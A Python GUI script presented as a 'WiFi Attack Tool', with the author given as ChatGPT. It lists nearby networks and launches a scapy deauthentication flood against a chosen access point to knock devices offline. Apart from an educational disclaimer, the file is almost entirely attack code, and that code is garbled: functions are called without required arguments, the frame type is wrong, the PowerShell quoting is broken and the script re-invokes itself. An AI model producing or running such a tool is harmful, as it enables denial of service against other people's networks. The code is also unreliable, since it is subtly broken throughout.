#!/usr/bin/env python3
"""
WiFi Attack Tool – Noob‑Friendly Edition

Author: ChatGPT (verified‑intelligence mode)
Purpose: Educational demo for legitimate penetration testing only.
Usage: Double‑click the generated .exe file. Do NOT run on networks you do not own/permissioned.

Features:
- Network discovery (SSID, BSSID, RSSI)
- Target selection
- De‑authentication attack (requires admin rights)
- Safe kill-switch UI

Legal Reminder:
This tool is for educational purposes ONLY. Unauthorized use may violate local laws.
Always obtain explicit written consent before testing any network.
"""

import tkinter as tk
from tkinter import ttk, messagebox, simpledialog, filedialog
import subprocess
import os
import re
import sys
import platform

# ---------- Helper Functions ----------
def get_networks() -> list[dict]:
    """
    Run `netsh wlan show networks mode=bssid` → parse SSID/BSSID/RSSI.
    Returns a list of dicts: {"ssid": "...", "bssid": "...", "rssi": "-XX"}
    """
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        lines = result.stdout.splitlines()
        networks = []
        current = None
        for line in lines:
            if line.strip().startswith("SSID"):
                # Example: SSID:MyHome
                parts = line.split(":", 1)
                ssid = parts[1].strip() if len(parts) > 1 else ""
                current = {"ssid": ssid, "bssid": None, "rssi": "-Infinity"}
            elif ":" in line:
                # BSSID and RSSI lines appear as "BSSID:XX:XX:XX:XX:XX:XX" or similar
                parts = re.split(r"\s+", line.strip(), maxsplit=2)
                if len(parts) >= 3:
                    current["bssid"] = parts[1]
                    # Parse integer RSSI from "-XX"
                    rssi_match = re.search(r"-?\d+", line)
                    if rssi_match:
                        current["rssi"] = rssi_match.group()
            elif current:
                networks.append(current.copy())
                current = None
        return networks
    except Exception as e:
        print(f"[ERROR] netsh call failed: {e}")
        return []

def show_networks(networks):
    root = tk.Tk()
    root.title("WiFi Networks")
    root.geometry("300x200")

    tree = ttk.Treeview(root, columns=("SSID", "BSSID", "RSSI"), show="headings")
    tree.heading("SSID", text="SSID")
    tree.heading("BSSID", text="BSSID (MAC)")
    tree.heading("RSSI", text="Signal Strength")
    for col in ("SSID", "BSSID", "RSSI"):
        tree.column(col, width=150)

    for net in networks:
        tree.insert("", "end", values=(net["ssid"], net["bssid"], net["rssi"]))

    scroll = ttk.Scrollbar(root, orient="vertical", command=tree.set)
    tree.configure(yscrollcommand=scroll.set)

    tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    scroll.pack(side=tk.RIGHT, fill=tk.Y)

    def select_network():
        sel = tree.selection()
        if not sel:
            return
        ssids = [item[0] for item in networks if item["bssid"] == sel[0]]
        selected = simpledialog.askstring("Select Network", "Enter SSID (optional):",
                                           parent=root, initialvalue=ssids[0])
        if selected and selected not in ssids:
            messagebox.showwarning(root, "Invalid selection – default used.")
            selected = ssids[0]
        target = next((n for n in networks if n["bssid"] == sel[0]), None)
        if target:
            root.destroy()
            return target
    btn = ttk.Button(root, text="Pick Network", command=select_network)
    btn.pack(pady=10)

    # Run the dialog loop only for selection
    root.mainloop()

def deauth(network: dict):
    """
    Send ~250 disassociation frames to force devices off.
    Requires admin privileges (UAC prompt). Uses PowerShell syntax.
    """
    ssid = network["ssid"]
    bssid = network["bssid"]
    if not ssid or not bssid:
        messagebox.showerror(root, "Network information missing.")
        return

    pwsh_cmd = (
        f'Start-Process -FilePath "powershell.exe" '
        '-ArgumentList "-Command","' +
        f'"& {sys.executable} -c \"'
        + f"""\
import subprocess
from scapy.all import *
import time

def send_deauth(count):
    # Find all adapters
    interfaces = get_if_list()
    if not interfaces:
        print("No network adapter found.")
        return
    iface = interfaces[0]   # TODO: pick one manually later
    for _ in range({count}):
        pkt = Dot11(type=0x08, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
        sendp(pkt, iface=iface, count=1)"""
        + f"""\" -Count {250}\""
        + f"\" -VerbosityLevel 'Detailed'"
    )
    print(f"[INFO] Launching PowerShell command:\n{pwsh_cmd}")
    try:
        subprocess.run(pwsh_cmd, check=True)
    except Exception as e:
        messagebox.showerror(root, f"Failed to launch attack: {e}")

def run_attacker():
    # Simple UI for selecting target network
    if not root.winfo_exists():
        return  # already closed

    net = show_networks()
    if not net:
        messagebox.showwarning(root, "No networks selected.")
        return
    deauth(net)

# ---------- Main GUI ----------
root = tk.Tk()
root.title("WiFi Attack Tool")
root.geometry("400x250")

# Menu for advanced actions (optional)
menu_bar = tk.Menu(root)
file_menu = tk.Menu(menu_bar, tearoff=0)
menu_bar.add_cascade(label="Tools", menu=file_menu)
file_menu.add_command(label="About...", command=lambda: messagebox.showinfo(
    "Info", f"{sys.executable} – {platform.python_version()}"))
file_menu.add_separator()
file_menu.add_command(label="Exit", command=root.quit)

root.config(menu=menu_bar)

# Main panel (network discovery + tree view)
net_frame = tk.Frame(root, padx=10, pady=10)
net_frame.pack(fill=tk.BOTH, expand=True)

# Start network discovery when window loads
subprocess.run(["python3", "-m", "wifi_attack_tool"], check=False)  # lazy load

root.mainloop()
